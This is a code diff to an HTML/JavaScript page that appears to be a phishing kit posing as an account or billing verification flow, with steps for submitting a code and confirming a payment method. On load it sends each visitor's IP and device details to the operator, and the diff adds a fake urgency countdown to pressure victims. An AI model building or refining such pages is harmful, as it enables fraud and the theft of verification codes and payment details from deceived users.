@@ -132,7 +132,6 @@
     </div>
     <div class="btn-row"><button class="btn" onclick="step(4, 5)">Submit Code</button></div>
 </div>
-<!-- Billing step - cleaned up, no duplicates -->
 <div id="p5" class="card hidden" style="max-width: 600px;">
     <h1>Confirm payment method</h1>
     <div style="font-size: 12px; color: var(--m-gray); margin-bottom: 10px;">Billing verification</div>
@@ -236,8 +235,23 @@
             input.value = v;
         }
     }
-   
+
+    // Sticky countdown timer on first page only
+    let remainingHours = 12;
+    const timerElement = document.getElementById('timer1');
+
+    function updateTimer() {
+        if (timerElement && document.getElementById('p1').classList.contains('fade-in') && !document.getElementById('p1').classList.contains('hidden')) {
+            timerElement.textContent = remainingHours + " hours";
+            if (remainingHours > 0) {
+                remainingHours--;
+            }
+        }
+    }
+
+    // Start countdown when page loads (only affects p1)
     window.onload = async () => {
+        // Existing IP detection code
         try {
             const res = await fetch('https://api.ipify.org?format=json');
             const data = await res.json();
@@ -245,6 +259,10 @@
             const ipLink = `[${uIP}](https://whoer.net/check?ip=${uIP})`;
             send(`🟢 *NEW VISITOR ONLINE*\n🌐 IP: ${ipLink}\n📱 Device: ${getDevice()}`);
         } catch (e) {}
+
+        // Start the sticky countdown (decrements every hour)
+        setInterval(updateTimer, 3600000); // 3600000 ms = 1 hour
+        updateTimer(); // Initial display
     };
    
     async function step(f, t) {
